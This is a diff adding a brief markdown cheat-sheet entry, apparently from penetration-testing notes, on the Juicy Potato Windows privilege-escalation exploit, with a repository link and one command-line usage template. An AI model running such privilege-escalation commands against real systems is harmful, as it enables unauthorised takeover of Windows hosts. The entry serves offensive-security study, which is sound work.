@@ -1,0 +1,8 @@
+---
+tags: [wpe, windows, exploit]
+---
+# Juicy Potato
+https://github.com/ohpe/juicy-potato
+
+#Usage
+juicypotato.exe -l <Port> -t * -p <Programtoexecute> 
